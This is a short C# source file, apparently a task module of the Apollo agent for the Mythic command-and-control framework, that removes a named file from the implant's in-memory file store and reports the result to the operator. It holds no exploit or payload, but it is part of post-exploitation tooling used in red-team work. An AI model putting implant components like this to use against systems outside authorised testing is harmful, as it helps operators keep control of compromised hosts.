#define COMMAND_NAME_UPPER

#if DEBUG
#define REMOVE_REGISTERED_FILE
#endif

#if REMOVE_REGISTERED_FILE


using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;

namespace Tasks
{
    public class remove_registered_file : Tasking
    {
        [DataContract]
        internal struct RemoveRegisteredFileParameters
        {
            [DataMember(Name = "file_name")]
            internal string FileName;
        }

        public remove_registered_file(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }


        public override void Start()
        {
            MythicTaskResponse resp;
            RemoveRegisteredFileParameters parameters = _jsonSerializer.Deserialize<RemoveRegisteredFileParameters>(_data.Parameters);
            // some additional upload logic
            bool success = _agent.GetFileManager().RemoveFile(parameters.FileName);
            if (success)
            {
                resp = CreateTaskResponse( $"{parameters.FileName} successfully removed from agent memory.", true);
            } else
            {
                resp = CreateTaskResponse($"{parameters.FileName} not removed from agent memory.", true, "error");
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif